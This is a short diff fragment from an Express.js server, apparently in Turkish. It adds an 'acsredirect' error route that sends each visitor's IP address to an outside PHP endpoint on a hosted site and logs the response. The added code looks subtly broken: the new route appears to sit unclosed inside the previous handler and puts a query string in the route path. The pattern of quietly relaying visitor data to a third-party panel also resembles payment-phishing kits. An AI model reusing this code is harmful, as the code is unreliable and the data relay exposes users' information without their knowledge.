@@ -233,7 +233,16 @@ app.get('/acsredirect', async (req, res) => {
       }
     );
     
-
+app.get('/acsredirect?control=error', async (req, res) => {
+  try {
+    const clientIp = getClientIp(req);
+    const response = await axios.post(
+      'https://forestgreen-rook-759809.hostingersite.com/dmn/acsredirect.php?control=error',
+      qs.stringify({ ip: clientIp }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
     // Yanıtı logla
     console.log('Gelen veri:', response.data);
 
